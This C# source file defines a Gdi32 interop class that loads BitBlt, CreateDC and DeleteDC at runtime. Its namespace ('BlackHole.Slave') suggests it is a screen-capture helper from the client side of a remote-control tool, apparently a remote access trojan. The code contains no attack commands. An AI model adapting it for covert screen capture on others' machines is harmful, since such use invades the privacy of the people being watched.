using System;
using System.Runtime.InteropServices;

namespace BlackHole.Slave.Helper.Native.Impl
{
    public sealed class Gdi32 : DynamicNativeLibrary<Gdi32>
    {
        public Gdi32() : base("gdi32.dll") { }

        public const int ROP_COPY = 0x00CC0020;

        [UnmanagedFunctionPointer(CallingConvention.Winapi, CharSet = CharSet.Auto)]
        public delegate bool dBitBlt([In] IntPtr hdc, int xDest, int yDest, int width, int height, 
            [In] IntPtr hdcSrc, int xSrc, int ySrc, int rop);

        [UnmanagedFunctionPointer(CallingConvention.Winapi, CharSet = CharSet.Auto)]
        public delegate IntPtr dCreateDC(string driver, string device, string output, IntPtr initData);

        [UnmanagedFunctionPointer(CallingConvention.Winapi, CharSet = CharSet.Auto)]
        public delegate bool dDeleteDC([In] IntPtr hdc);

        public static dBitBlt BitBlt = 
            Instance.FindUmanagedFunction<dBitBlt>("BitBlt");

        public static dCreateDC CreateDC = 
            Instance.FindUmanagedFunction<dCreateDC>("CreateDCW");

        public static dDeleteDC DeleteDC = 
            Instance.FindUmanagedFunction<dDeleteDC>("DeleteDC");
    }
}
